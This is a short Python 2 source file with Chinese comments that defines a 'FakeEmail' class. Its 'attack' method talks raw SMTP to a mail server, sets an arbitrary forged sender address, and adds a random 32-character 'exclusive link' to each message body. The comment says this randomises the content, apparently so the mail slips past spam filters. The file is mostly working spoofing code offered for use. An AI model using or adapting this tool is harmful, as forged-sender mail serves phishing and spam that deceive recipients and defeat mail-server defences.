# -*- coding: utf-8 -*-
import Email
import random
import string


class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
        self.create()

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        # 建立连接
        code, msg = self.emailer.Connect()

        # 建立会话
        print "send ehlo"
        code, msg = self.emailer.Send(u"ehlo antispam")
        if not code:
            return (code, msg)

        # 表明发件地址
        print "send mail from"
        code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
        if not code:
            return (code, msg)

        # 表明收件地址
        print "send rcpt to"
        code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
        if not code:
            return (code, msg)

        # 信件具体内容
        print "send data"
        code, msg = self.emailer.Send(u"data")
        if not code:
            return (code, msg)

        # to:
        print "send to"
        code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
        if not code:
            return (code, msg)

        # from:
        print "send from"
        code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
        if not code:
            return (code, msg)

        # subject:
        print "send subject"
        code, msg = self.emailer.Send("subject: "+subject, recv=False)
        if not code:
            return (code, msg)

        # body:
        print "send body"
        code, msg = self.emailer.Send(
            content+u"\r\n\r\n你的专属链接为："+"".join(
                random.choice(string.hexdigits)
                for i in range(32)
            )+"\r\n.\r\n",  # 随机化部分邮件内容

            check="250"  # 状态码为 250 说明发送成功
        )

        return (code, msg)
